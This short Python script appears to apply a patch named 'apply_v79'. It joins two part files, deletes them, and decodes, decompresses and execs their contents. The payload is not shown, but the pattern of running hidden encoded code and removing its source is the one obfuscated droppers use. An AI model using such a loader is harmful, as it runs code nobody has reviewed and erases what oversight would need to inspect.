from pathlib import Path
import base64,gzip
p=Path(__file__).resolve().parent
data=(p/"apply_v79.part1").read_text()+(p/"apply_v79.part2").read_text()
(p/"apply_v79.part1").unlink()
(p/"apply_v79.part2").unlink()
exec(compile(gzip.decompress(base64.b64decode(data)), __file__, "exec"))
